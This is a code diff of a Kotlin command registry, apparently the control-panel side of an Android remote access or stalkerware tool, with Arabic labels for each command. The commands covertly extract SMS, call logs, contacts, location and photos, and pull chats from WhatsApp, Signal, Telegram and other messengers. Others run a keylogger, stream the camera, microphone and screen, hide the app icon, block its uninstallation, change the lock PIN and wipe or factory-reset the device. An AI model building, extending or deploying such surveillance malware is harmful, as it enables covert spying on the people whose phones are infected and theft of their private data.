@@ -1,24 +1,27 @@
 package com.abuzahra.admin.data.model
 
 /**
- * Complete command definitions matching the server's COMMAND_REGISTRY.
- * All 116 commands organized by category.
+ * Command definitions EXACTLY matching the server's COMMAND_REGISTRY.
+ * The server expects these exact registry keys (e.g., "sms", "screenshot", "location").
+ * The server then maps them to actual device commands internally.
+ *
+ * DO NOT change the "key" values - they must match server/modules/commands.py exactly.
  */
 object CommandDefinitions {
 
-    enum class Category(val displayName: String) {
-        DATA("البيانات"),
-        SOCIAL("التواصل الاجتماعي"),
-        CONTROL("التحكم"),
-        APPS("التطبيقات"),
-        FILES("الملفات"),
-        SECURITY("الأمان"),
-        MONITOR("المراقبة"),
-        STREAMING("البث")
+    enum class Category(val displayName: String, val serverKey: String) {
+        DATA("البيانات", "data"),
+        SOCIAL("التواصل الاجتماعي", "social"),
+        CONTROL("التحكم", "control"),
+        APPS("التطبيقات", "apps"),
+        FILES("الملفات", "files"),
+        SECURITY("الأمان", "security"),
+        MONITOR("المراقبة", "monitor"),
+        STREAMING("البث", "streaming")
     }
 
     data class CommandDef(
-        val key: String,
+        val key: String,        // MUST match server COMMAND_REGISTRY key exactly
         val name: String,
         val description: String,
         val category: Category
@@ -27,152 +30,152 @@ object CommandDefinitions {
     private val allCommands: List<CommandDef> = listOf(
 
         // ═══════════════════════════════════════════════════════════
-        // DATA — 16 commands
+        // DATA — 20 commands (matches server "data" category)
         // ═══════════════════════════════════════════════════════════
-        CommandDef("get_contacts", "جهات الاتصال", "استخراج جميع جهات الاتصال من الجهاز", Category.DATA),
-        CommandDef("get_sms", "الرسائل القصيرة", "استخراج جميع الرسائل النصية القصيرة", Category.DATA),
-        CommandDef("get_sms_inbox", "الرسائل الواردة", "استخراج الرسائل الواردة فقط", Category.DATA),
-        CommandDef("get_sms_sent", "الرسائل المرسلة", "استخراج الرسائل المرسلة فقط", Category.DATA),
-        CommandDef("get_call_log", "سجل المكالمات", "استخراج سجل المكالمات الكامل", Category.DATA),
-        CommandDef("get_calendar", "التقويم", "استخراج أحداث التقويم والمواعيد", Category.DATA),
-        CommandDef("get_notes", "الملاحظات", "استخراج الملاحظات المحفوظة على الجهاز", Category.DATA),
-        CommandDef("get_browser_history", "سجل المتصفح", "استخراج سجل التصفح والمواقع المزارة", Category.DATA),
-        CommandDef("get_wifi_networks", "شبكات Wi-Fi", "استخراج شبكات Wi-Fi المحفوظة", Category.DATA),
-        CommandDef("get_bluetooth_devices", "أجهزة بلوتوث", "استخراج أجهزة البلوتوث المقترنة", Category.DATA),
-        CommandDef("get_installed_apps", "التطبيقات المثبتة", "استخراج قائمة التطبيقات المثبتة على الجهاز", Category.DATA),
-        CommandDef("get_device_info", "معلومات الجهاز", "استخراج المعلومات الكاملة للجهاز", Category.DATA),
-        CommandDef("get_battery_info", "معلومات البطارية", "استخراج حالة البطارية ومستوى الشحن", Category.DATA),
-        CommandDef("get_sim_info", "معلومات شريحة SIM", "استخراج معلومات شريحة SIM", Category.DATA),
-        CommandDef("get_phone_number", "رقم الهاتف", "استخراج رقم الهاتف من الجهاز", Category.DATA),
-        CommandDef("get_clipboard", "محتوى الحافظة", "استخراج النص المنسوخ في الحافظة", Category.DATA),
+        CommandDef("sms", "الرسائل", "استخراج جميع الرسائل النصية القصيرة", Category.DATA),
+        CommandDef("calls", "سجل المكالمات", "استخراج سجل المكالمات الكامل", Category.DATA),
+        CommandDef("contacts", "جهات الاتصال", "استخراج جميع جهات الاتصال من الجهاز", Category.DATA),
+        CommandDef("location", "الموقع", "الحصول على الموقع الجغرافي الحالي", Category.DATA),
+        CommandDef("notifications", "الإشعارات", "استخراج جميع الإشعارات الحالية", Category.DATA),
+        CommandDef("apps", "التطبيقات", "استخراج قائمة التطبيقات", Category.DATA),
+        CommandDef("info", "معلومات الجهاز", "استخراج المعلومات الكاملة للجهاز", Category.DATA),
+        CommandDef("battery", "البطارية", "استخراج حالة البطارية ومستوى الشحن", Category.DATA),
+        CommandDef("gallery", "المعرض", "استخراج الصور من المعرض", Category.DATA),
+        CommandDef("clipboard", "الحافظة", "استخراج النص المنسوخ في الحافظة", Category.DATA),
+        CommandDef("all_data", "جميع البيانات", "استخراج جميع البيانات دفعة واحدة", Category.DATA),
+        CommandDef("wifi_info", "معلومات WiFi", "استخراج شبكات WiFi المحفوظة", Category.DATA),
+        CommandDef("network_info", "معلومات الشبكة", "استخراج معلومات الشبكة الحالية", Category.DATA),
+        CommandDef("sim_info", "معلومات SIM", "استخراج معلومات شريحة SIM", Category.DATA),
+        CommandDef("storage_info", "التخزين", "استخراج معلومات التخزين", Category.DATA),
+        CommandDef("installed_apps", "التطبيقات المثبتة", "استخراج قائمة التطبيقات المثبتة", Category.DATA),
+        CommandDef("running_apps", "التطبيقات النشطة", "استخراج التطبيقات قيد التشغيل حالياً", Category.DATA),
+        CommandDef("calendar", "التقويم", "استخراج أحداث التقويم والمواعيد", Category.DATA),
+        CommandDef("browser_history", "سجل المتصفح", "استخراج سجل التصفح والمواقع المزارة", Category.DATA),
+        CommandDef("app_usage", "وقت الشاشة", "استخراج وقت استخدام التطبيقات", Category.DATA),
 
         // ═══════════════════════════════════════════════════════════
-        // SOCIAL — 13 commands
+        // SOCIAL — 11 commands (matches server "social" category)
         // ═══════════════════════════════════════════════════════════
-        CommandDef("get_whatsapp", "واتساب", "استخراج محادثات ووسائط واتساب", Category.SOCIAL),
-        CommandDef("get_telegram", "تيليجرام", "استخراج محادثات ووسائط تيليجرام", Category.SOCIAL),
-        CommandDef("get_facebook_messenger", "فيسبوك ماسنجر", "استخراج محادثات فيسبوك ماسنجر", Category.SOCIAL),
-        CommandDef("get_instagram", "انستغرام", "استخراج محادثات انستغرام دايركت", Category.SOCIAL),
-        CommandDef("get_snapchat", "سناب شات", "استخراج رسائل سناب شات", Category.SOCIAL),
-        CommandDef("get_viber", "فيبر", "استخراج محادثات ورسائل فيبر", Category.SOCIAL),
-        CommandDef("get_signal", "سيجنال", "استخراج محادثات سيجنال المشفرة", Category.SOCIAL),
-        CommandDef("get_skype", "سكايب", "استخراج محادثات سكايب", Category.SOCIAL),
-        CommandDef("get_tiktok", "تيك توك", "استخراج رسائل وتفاعلات تيك توك", Category.SOCIAL),
-        CommandDef("get_line", "لاين", "استخراج محادثات لاين", Category.SOCIAL),
-        CommandDef("get_wechat", "وي تشات", "استخراج محادثات وي تشات", Category.SOCIAL),
-        CommandDef("get_hangouts", "هانج آوتس", "استخراج محادثات جوجل هانج آوتس", Category.SOCIAL),
-        CommandDef("get_discord", "ديسكورد", "استخراج محادثات ورسائل ديسكورد", Category.SOCIAL),
+        CommandDef("whatsapp", "واتساب", "استخراج محادثات ووسائط واتساب", Category.SOCIAL),
+        CommandDef("telegram_app", "تيليجرام", "استخراج محادثات ووسائط تيليجرام", Category.SOCIAL),
+        CommandDef("instagram", "انستغرام", "استخراج محادثات انستغرام دايركت", Category.SOCIAL),
+        CommandDef("messenger", "ماسنجر", "استخراج محادثات فيسبوك ماسنجر", Category.SOCIAL),
+        CommandDef("snapchat", "سناب شات", "استخراج رسائل سناب شات", Category.SOCIAL),
+        CommandDef("tiktok", "تيك توك", "استخراج رسائل وتفاعلات تيك توك", Category.SOCIAL),
+        CommandDef("twitter", "تويتر", "استخراج رسائل تويتر", Category.SOCIAL),
+        CommandDef("viber", "فايبر", "استخراج محادثات ورسائل فايبر", Category.SOCIAL),
+        CommandDef("signal", "سيجنال", "استخراج محادثات سيجنال المشفرة", Category.SOCIAL),
+        CommandDef("facebook", "فيسبوك", "استخراج بيانات فيسبوك", Category.SOCIAL),
+        CommandDef("youtube", "يوتيوب", "استخراج بيانات يوتيوب", Category.SOCIAL),
 
         // ═══════════════════════════════════════════════════════════
-        // CONTROL — 32 commands
+        // CONTROL — 28 commands (matches server "control" category)
         // ═══════════════════════════════════════════════════════════
-        CommandDef("take_screenshot", "لقطة شاشة", "التقاط لقطة شاشة للجهاز", Category.CONTROL),
-        CommandDef("get_location", "الموقع الحالي", "الحصول على الموقع الجغرافي الحالي", Category.CONTROL),
-        CommandDef("start_location_tracking", "تتبع الموقع", "بدء تتبع الموقع بشكل مستمر", Category.CONTROL),
-        CommandDef("stop_location_tracking", "إيقاف التتبع", "إيقاف تتبع الموقع المستمر", Category.CONTROL),
-        CommandDef("ring_device", "رنين الجهاز", "تشغيل رنين الجهاز بكامل الصوت", Category.CONTROL),
-        CommandDef("vibrate_device", "اهتزاز الجهاز", "تشغيل اهتزاز الجهاز", Category.CONTROL),
-        CommandDef("show_message", "إظهار رسالة", "عرض رسالة على شاشة الجهاز", Category.CONTROL),
+        CommandDef("ping", "Ping", "إرسال طلب ping للجهاز", Category.CONTROL),
+        CommandDef("vibrate", "اهتزاز", "تشغيل اهتزاز الجهاز", Category.CONTROL),
+        CommandDef("ring", "رنين", "تشغيل رنين الجهاز بكامل الصوت", Category.CONTROL),
+        CommandDef("screenshot", "لقطة شاشة", "التقاط لقطة شاشة للجهاز", Category.CONTROL),
+        CommandDef("front_camera", "الكاميرا الأمامية", "التقاط صورة بالكاميرا الأمامية", Category.CONTROL),
+        CommandDef("back_camera", "الكاميرا الخلفية", "التقاط صورة بالكاميرا الخلفية", Category.CONTROL),
+        CommandDef("record_audio", "تسجيل صوت", "تسجيل صوت من ميكروفون الجهاز", Category.CONTROL),
+        CommandDef("record_screen", "تسجيل الشاشة", "بدء تسجيل فيديو لشاشة الجهاز", Category.CONTROL),
+        CommandDef("lock_phone", "قفل الجهاز", "قفل شاشة الجهاز", Category.CONTROL),
+        CommandDef("unlock_phone", "فتح الجهاز", "فتح شاشة الجهاز", Category.CONTROL),
+        CommandDef("reboot", "إعادة تشغيل", "إعادة تشغيل الجهاز", Category.CONTROL),
+        CommandDef("shutdown", "إيقاف التشغيل", "إيقاف تشغيل الجهاز", Category.CONTROL),
+        CommandDef("set_volume", "التحكم بالصوت", "تعيين مستوى الصوت", Category.CONTROL),
+        CommandDef("set_brightness", "السطوع", "تعيين مستوى سطوع الشاشة", Category.CONTROL),
+        CommandDef("set_ringtone", "نغمة الرنين", "تغيير نغمة رنين الجهاز", Category.CONTROL),
+        CommandDef("enable_wifi", "تشغيل WiFi", "تشغيل شبكة WiFi", Category.CONTROL),
+        CommandDef("disable_wifi", "إيقاف WiFi", "إيقاف شبكة WiFi", Category.CONTROL),
+        CommandDef("enable_bluetooth", "تشغيل بلوتوث", "تشغيل البلوتوث", Category.CONTROL),
+        CommandDef("disable_bluetooth", "إيقاف بلوتوث", "إيقاف البلوتوث", Category.CONTROL),
+        CommandDef("enable_mobile_data", "تشغيل البيانات", "تشغيل البيانات الخلوية", Category.CONTROL),
+        CommandDef("disable_mobile_data", "إيقاف البيانات", "إيقاف البيانات الخلوية", Category.CONTROL),
+        CommandDef("enable_hotspot", "تشغيل الهوت سبوت", "تشغيل نقطة اتصال WiFi", Category.CONTROL),
+        CommandDef("disable_hotspot", "إيقاف الهوت سبوت", "إيقاف نقطة اتصال WiFi", Category.CONTROL),
+        CommandDef("airplane_on", "وضع الطيار", "تفعيل وضع الطيران", Category.CONTROL),
+        CommandDef("airplane_off", "إلغاء الطيران", "إلغاء وضع الطيران", Category.CONTROL),
+        CommandDef("torch_on", "تشغيل الفلاش", "تشغيل ضوء الكشاف", Category.CONTROL),
+        CommandDef("torch_off", "إيقاف الفلاش", "إيقاف ضوء الكشاف", Category.CONTROL),
+        CommandDef("play_sound", "تشغيل صوت", "تشغيل صوت على الجهاز", Category.CONTROL),
+        CommandDef("speak_text", "نطق نص", "نطق نص على الجهاز", Category.CONTROL),
+        CommandDef("show_notification", "إظهار إشعار", "عرض إشعار على شاشة الجهاز", Category.CONTROL),
         CommandDef("open_url", "فتح رابط", "فتح رابط في متصفح الجهاز", Category.CONTROL),
-        CommandDef("send_sms", "إرسال رسالة نصية", "إرسال رسالة نصية قصيرة من الجهاز", Category.CONTROL),
+        CommandDef("send_sms", "إرسال رسالة نصية", "إرسال رسالة نصية من الجهاز", Category.CONTROL),
         CommandDef("make_call", "إجراء مكالمة", "إجراء مكالمة هاتفية من الجهاز", Category.CONTROL),
-        CommandDef("set_wallpaper", "تغيير الخلفية", "تغيير خلفية شاشة الجهاز", Category.CONTROL),
-        CommandDef("set_ringtone", "تغيير نغمة الرنين", "تغيير نغمة رنين الجهاز", Category.CONTROL),
-        CommandDef("set_clipboard", "تعيين الحافظة", "كتابة نص في حافظة الجهاز", Category.CONTROL),
-        CommandDef("open_camera", "فتح الكاميرا", "فتح تطبيق الكاميرا على الجهاز", Category.CONTROL),
-        CommandDef("toggle_flashlight", "تشغيل/إيقاف الكشاف", "تشغيل أو إيقاف ضوء الكشاف", Category.CONTROL),
-        CommandDef("get_running_apps", "التطبيقات النشطة", "الحصول على قائمة التطبيقات قيد التشغيل", Category.CONTROL),
-        CommandDef("force_stop_app", "إيقاف تطبيق قسرياً", "إيقاف تطبيق بشكل قسري", Category.CONTROL),
-        CommandDef("clear_app_data", "مسح بيانات تطبيق", "مسح جميع بيانات تطبيق معين", Category.CONTROL),
-        CommandDef("uninstall_app", "إلغاء تثبيت تطبيق", "إلغاء تثبيت تطبيق من الجهاز", Category.CONTROL),
-        CommandDef("open_app", "فتح تطبيق", "فتح تطبيق على الجهاز", Category.CONTROL),
-        CommandDef("restart_device", "إعادة تشغيل الجهاز", "إعادة تشغيل الجهاز", Category.CONTROL),
-        CommandDef("lock_device", "قفل الجهاز", "قفل شاشة الجهاز", Category.CONTROL),
-        CommandDef("wipe_device", "مسح الجهاز", "مسح جميع بيانات الجهاز بالكامل", Category.CONTROL),
-        CommandDef("get_notifications", "الإشعارات", "استخراج جميع الإشعارات الحالية", Category.CONTROL),
-        CommandDef("dismiss_notification", "إزالة إشعار", "إزالة إشعار معين من الجهاز", Category.CONTROL),
-        CommandDef("reply_notification", "الرد على إشعار", "الرد على إشعار مباشرة", Category.CONTROL),
-        CommandDef("press_button", "ضغط زر", "محاكاة ضغط زر على الجهاز", Category.CONTROL),
-        CommandDef("swipe", "سحب الشاشة", "محاكاة سحب على الشاشة", Category.CONTROL),
-        CommandDef("tap", "نقر على الشاشة", "محاكاة نقر على إحداثيات معينة", Category.CONTROL),
-        CommandDef("type_text", "كتابة نص", "محاكاة كتابة نص على الجهاز", Category.CONTROL),
-        CommandDef("get_screen_size", "حجم الشاشة", "الحصول على أبعاد الشاشة", Category.CONTROL),
-        CommandDef("get_screen_density", "كثافة الشاشة", "الحصول على كثافة بكسلات الشاشة", Category.CONTROL),
 
         // ═══════════════════════════════════════════════════════════
-        // APPS — 12 commands
+        // APPS — 8 commands (matches server "apps" category)
         // ═══════════════════════════════════════════════════════════
-        CommandDef("list_apps", "قائمة التطبيقات", "الحصول على قائمة كاملة بجميع التطبيقات", Category.APPS),
-        CommandDef("app_info", "معلومات تطبيق", "الحصول على تفاصيل تطبيق معين", Category.APPS),
+        CommandDef("open_app", "فتح تطبيق", "فتح تطبيق على الجهاز", Category.APPS),
+        CommandDef("close_app", "إغلاق تطبيق", "إغلاق تطبيق", Category.APPS),
         CommandDef("install_app", "تثبيت تطبيق", "تثبيت تطبيق من رابط APK", Category.APPS),
-        CommandDef("update_app", "تحديث تطبيق", "تحديث تطبيق إلى أحدث إصدار", Category.APPS),
-        CommandDef("enable_app", "تفعيل تطبيق", "تفعيل تطبيق معطل", Category.APPS),
-        CommandDef("disable_app", "تعطيل تطبيق", "تعطيل تطبيق على الجهاز", Category.APPS),
-        CommandDef("clear_app_cache", "مسح ذاكرة التخزين المؤقت", "مسح ذاكرة التخزين المؤقت للتطبيق", Category.APPS),
-        CommandDef("get_app_permissions", "صلاحيات التطبيق", "عرض صلاحيات تطبيق معين", Category.APPS),
-        CommandDef("set_app_permission", "تعيين صلاحية", "تعيين أو إزالة صلاحية تطبيق", Category.APPS),
-        CommandDef("get_app_data_usage", "استهلاك البيانات", "عرض استهلاك التطبيق للبيانات", Category.APPS),
-        CommandDef("backup_app", "نسخ احتياطي للتطبيق", "أخذ نسخة احتياطية من تطبيق", Category.APPS),
-        CommandDef("restore_app", "استعادة تطبيق", "استعادة تطبيق من نسخة احتياطية", Category.APPS),
+        CommandDef("uninstall_app", "حذف تطبيق", "إلغاء تثبيت تطبيق", Category.APPS),
+        CommandDef("block_app", "حظر تطبيق", "حظر تطبيق من التشغيل", Category.APPS),
+        CommandDef("unblock_app", "إلغاء حظر", "إلغاء حظر تطبيق", Category.APPS),
+        CommandDef("clear_app_data", "مسح بيانات", "مسح جميع بيانات تطبيق", Category.APPS),
+        CommandDef("force_stop_app", "إيقاف قسري", "إيقاف تطبيق بشكل قسري", Category.APPS),
 
         // ═══════════════════════════════════════════════════════════
-        // FILES — 16 commands
+        // FILES — 12 commands (matches server "files" category)
         // ═══════════════════════════════════════════════════════════
         CommandDef("list_files", "عرض الملفات", "عرض الملفات والمجلدات في مسار معين", Category.FILES),
-        CommandDef("download_file", "تحميل ملف", "تحميل ملف من الجهاز إلى الخادم", Category.FILES),
-        CommandDef("upload_file", "رفع ملف", "رفع ملف من الخادم إلى الجهاز", Category.FILES),
+        CommandDef("list_downloads", "التنزيلات", "عرض ملفات التنزيلات", Category.FILES),
+        CommandDef("list_dcim", "الكاميرا", "عرض ملفات الكاميرا", Category.FILES),
+        CommandDef("list_music", "الموسيقى", "عرض ملفات الموسيقى", Category.FILES),
+        CommandDef("list_videos", "الفيديوهات", "عرض ملفات الفيديو", Category.FILES),
+        CommandDef("list_documents", "المستندات", "عرض المستندات", Category.FILES),
+        CommandDef("list_whatsapp", "واتساب ملفات", "عرض ملفات واتساب", Category.FILES),
+        CommandDef("list_telegram_files", "تيليجرام ملفات", "عرض ملفات تيليجرام", Category.FILES),
+        CommandDef("recent_files", "أحدث الملفات", "عرض أحدث الملفات", Category.FILES),
+        CommandDef("search_files", "بحث ملفات", "البحث عن ملفات على الجهاز", Category.FILES),
+        CommandDef("get_file", "تحميل ملف", "تحميل ملف من الجهاز", Category.FILES),
         CommandDef("delete_file", "حذف ملف", "حذف ملف من الجهاز", Category.FILES),
-        CommandDef("rename_file", "إعادة تسمية ملف", "إعادة تسمية ملف على الجهاز", Category.FILES),
-        CommandDef("create_folder", "إنشاء مجلد", "إنشاء مجلد جديد على الجهاز", Category.FILES),
-        CommandDef("get_file_info", "معلومات ملف", "الحصول على تفاصيل ملف معين", Category.FILES),
-        CommandDef("copy_file", "نسخ ملف", "نسخ ملف إلى مسار آخر", Category.FILES),
-        CommandDef("move_file", "نقل ملف", "نقل ملف إلى مسار آخر", Category.FILES),
-        CommandDef("search_files", "البحث في الملفات", "البحث عن ملفات على الجهاز", Category.FILES),
-        CommandDef("get_media", "الوسائط", "استخراج جميع ملفات الوسائط", Category.FILES),
-        CommandDef("get_photos", "الصور", "استخراج جميع الصور من الجهاز", Category.FILES),
-        CommandDef("get_videos", "الفيديوهات", "استخراج جميع الفيديوهات من الجهاز", Category.FILES),
-        CommandDef("get_audio", "ملفات الصوت", "استخراج جميع ملفات الصوت من الجهاز", Category.FILES),
-        CommandDef("get_documents", "المستندات", "استخراج المستندات من الجهاز", Category.FILES),
-        CommandDef("delete_media", "حذف وسائط", "حذف ملف وسائط من الجهاز", Category.FILES),
+        CommandDef("send_full_backup", "نسخ احتياطي كامل", "أخذ نسخة احتياطية كاملة", Category.FILES),
 
         // ═══════════════════════════════════════════════════════════
-        // SECURITY — 12 commands
+        // SECURITY — 11 commands (matches server "security" category)
         // ═══════════════════════════════════════════════════════════
-        CommandDef("get_permissions", "الصلاحيات", "عرض جميع صلاحيات التطبيق", Category.SECURITY),
-        CommandDef("request_permission", "طلب صلاحية", "طلب صلاحية جديدة من النظام", Category.SECURITY),
+        CommandDef("wipe_data", "مسح البيانات", "مسح جميع البيانات", Category.SECURITY),
+        CommandDef("factory_reset", "إعادة تعيين المصنع", "إعادة تعيين المصنع", Category.SECURITY),
+        CommandDef("show_app", "إظهار التطبيق", "إظهار أيقونة التطبيق", Category.SECURITY),
+        CommandDef("hide_app", "إخفاء التطبيق", "إخفاء أيقونة التطبيق", Category.SECURITY),
+        CommandDef("change_passcode", "تغيير رمز PIN", "تغيير رمز PIN لقفل الشاشة", Category.SECURITY),
+        CommandDef("enable_biometric", "تشغيل البصمة", "تفعيل قفل البصمة", Category.SECURITY),
+        CommandDef("disable_biometric", "إيقاف البصمة", "إيقاف قفل البصمة", Category.SECURITY),
+        CommandDef("anti_uninstall_on", "حماية الحذف", "تفعيل حماية الحذف", Category.SECURITY),
+        CommandDef("anti_uninstall_off", "إلغاء الحماية", "إلغاء حماية الحذف", Category.SECURITY),
+        CommandDef("device_admin_status", "حالة المسؤول", "عرض حالة مسؤول الجهاز", Category.SECURITY),
         CommandDef("check_root", "فحص الروت", "التحقق مما إذا كان الجهاز مروتاً", Category.SECURITY),
-        CommandDef("enable_accessibility", "تفعيل إمكانية الوصول", "تفعيل خدمة إمكانية الوصول", Category.SECURITY),
-        CommandDef("get_security_info", "معلومات الأمان", "الحصول على معلومات أمان الجهاز", Category.SECURITY),
-        CommandDef("set_pin", "تعيين رقم PIN", "تعيين رمز PIN لقفل الشاشة", Category.SECURITY),
-        CommandDef("change_password", "تغيير كلمة المرور", "تغيير كلمة مرور قفل الشاشة", Category.SECURITY),
-        CommandDef("enable_lock", "تفعيل القفل", "تفعيل قفل شاشة الجهاز", Category.SECURITY),
-        CommandDef("disable_lock", "تعطيل القفل", "تعطيل قفل شاشة الجهاز", Category.SECURITY),
-        CommandDef("get_lock_info", "معلومات القفل", "الحصول على معلومات نوع القفل", Category.SECURITY),
-        CommandDef("set_device_admin", "تعيين مسؤول الجهاز", "تفعيل التطبيق كمسؤول للجهاز", Category.SECURITY),
-        CommandDef("remove_device_admin", "إزالة مسؤول الجهاز", "إزالة صلاحيات مسؤول الجهاز", Category.SECURITY),
 
         // ═══════════════════════════════════════════════════════════
-        // MONITOR — 11 commands
+        // MONITOR — 10 commands (matches server "monitor" category)
         // ═══════════════════════════════════════════════════════════
-        CommandDef("start_keylogger", "بدء تسجيل المفاتيح", "بدء تسجيل ضغطات المفاتيح", Category.MONITOR),
-        CommandDef("stop_keylogger", "إيقاف تسجيل المفاتيح", "إيقاف تسجيل ضغطات المفاتيح", Category.MONITOR),
-        CommandDef("get_keylog_data", "بيانات تسجيل المفاتيح", "استخراج بيانات تسجيل المفاتيح", Category.MONITOR),
-        CommandDef("start_screen_record", "بدء تسجيل الشاشة", "بدء تسجيل فيديو لشاشة الجهاز", Category.MONITOR),
-        CommandDef("stop_screen_record", "إيقاف تسجيل الشاشة", "إيقاف تسجيل شاشة الجهاز", Category.MONITOR),
-        CommandDef("start_audio_record", "بدء تسجيل الصوت", "بدء تسجيل صوت من ميكروفون الجهاز", Category.MONITOR),
-        CommandDef("stop_audio_record", "إيقاف تسجيل الصوت", "إيقاف تسجيل الصوت", Category.MONITOR),
-        CommandDef("get_audio_recordings", "تسجيلات الصوت", "استخراج التسجيلات الصوتية المحفوظة", Category.MONITOR),
-        CommandDef("start_camera_capture", "بدء التقاط الكاميرا", "بدء التقاط صور من كاميرا الجهاز", Category.MONITOR),
-        CommandDef("stop_camera_capture", "إيقاف التقاط الكاميرا", "إيقاف التقاط الكاميرا", Category.MONITOR),
-        CommandDef("monitor_app_usage", "مراقبة استخدام التطبيقات", "بدء مراقبة استخدام التطبيقات", Category.MONITOR),
+        CommandDef("keylogger_start", "بدء تسجيل المفاتيح", "بدء تسجيل ضغطات المفاتيح", Category.MONITOR),
+        CommandDef("keylogger_stop", "إيقاف تسجيل المفاتيح", "إيقاف تسجيل ضغطات المفاتيح", Category.MONITOR),
+        CommandDef("get_keylogger", "عرض السجل", "عرض بيانات تسجيل المفاتيح", Category.MONITOR),
+        CommandDef("screen_record_start", "بدء تسجيل الشاشة", "بدء تسجيل فيديو للشاشة", Category.MONITOR),
+        CommandDef("screen_record_stop", "إيقاف التسجيل", "إيقاف تسجيل الشاشة", Category.MONITOR),
+        CommandDef("location_live", "تتبع مباشر", "بدء تتبع الموقع المستمر", Category.MONITOR),
+        CommandDef("location_stop", "إيقاف التتبع", "إيقاف تتبع الموقع", Category.MONITOR),
+        CommandDef("clipboard_monitor_start", "مراقبة الحافظة", "بدء مراقبة الحافظة", Category.MONITOR),
+        CommandDef("clipboard_monitor_stop", "إيقاف مراقبة الحافظة", "إيقاف مراقبة الحافظة", Category.MONITOR),
+        CommandDef("sms_monitor", "مراقبة الرسائل", "بدء مراقبة الرسائل الواردة", Category.MONITOR),
+        CommandDef("call_monitor", "مراقبة المكالمات", "بدء مراقبة المكالمات", Category.MONITOR),
 
         // ═══════════════════════════════════════════════════════════
-        // STREAMING — 4 commands
+        // STREAMING — 9 commands (matches server "streaming" category)
         // ═══════════════════════════════════════════════════════════
-        CommandDef("start_video_stream", "بدء بث الفيديو", "بدء بث مباشر من كاميرا الجهاز", Category.STREAMING),
-        CommandDef("stop_video_stream", "إيقاف بث الفيديو", "إيقاف البث المباشر للفيديو", Category.STREAMING),
-        CommandDef("start_audio_stream", "بدء بث الصوت", "بدء بث مباشر من ميكروفون الجهاز", Category.STREAMING),
-        CommandDef("stop_audio_stream", "إيقاف بث الصوت", "إيقاف البث المباشر للصوت", Category.STREAMING)
+        CommandDef("start_screen_stream", "بث الشاشة", "بدء بث مباشر من الشاشة", Category.STREAMING),
+        CommandDef("stop_screen_stream", "إيقاف بث الشاشة", "إيقاف بث الشاشة", Category.STREAMING),
+        CommandDef("start_camera_stream", "بث الكاميرا", "بدء بث مباشر من الكاميرا", Category.STREAMING),
+        CommandDef("stop_camera_stream", "إيقاف بث الكاميرا", "إيقاف بث الكاميرا", Category.STREAMING),
+        CommandDef("start_audio_stream", "بث الصوت", "بدء بث مباشر من الميكروفون", Category.STREAMING),
+        CommandDef("stop_audio_stream", "إيقاف بث الصوت", "إيقاف بث الصوت", Category.STREAMING),
+        CommandDef("switch_camera", "تبديل الكاميرا", "تبديل بين الكاميرا الأمامية والخلفية", Category.STREAMING),
+        CommandDef("set_stream_quality", "جودة البث", "تعيين جودة البث المباشر", Category.STREAMING),
+        CommandDef("stop_all_streams", "إيقاف كل البث", "إيقاف جميع البثوصات النشطة", Category.STREAMING),
     )
 
     /**
@@ -190,4 +193,9 @@ object CommandDefinitions {
     fun findByKey(key: String): CommandDef? {
         return allCommands.find { it.key == key }
     }
+
+    /**
+     * Total number of commands.
+     */
+    val totalCommands: Int get() = allCommands.size
 }
